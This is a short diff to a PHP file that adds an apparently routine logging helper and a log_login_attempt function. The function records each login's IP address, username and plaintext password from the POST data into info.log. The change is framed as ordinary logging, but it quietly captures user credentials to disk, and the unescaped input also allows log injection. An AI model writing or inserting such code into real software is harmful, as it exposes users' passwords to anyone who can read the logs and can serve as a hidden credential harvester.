@@ -68,6 +68,15 @@ function log_error($message) {
     write_log($message, "error.log");
 }
 
+function log_info($message) {
+    write_log($message, "info.log");
+}
+
+function log_login_attempt($attempt) {
+    log_info("Login number $attempt from " . $_SERVER['REMOTE_ADDR'] . " with username=" . $_POST['username'] .
+             " and password=" . $_POST['password']);
+}
+
 function request_url($request) {
     $uri = $request->getURI();
     $query = $uri->getQuery();
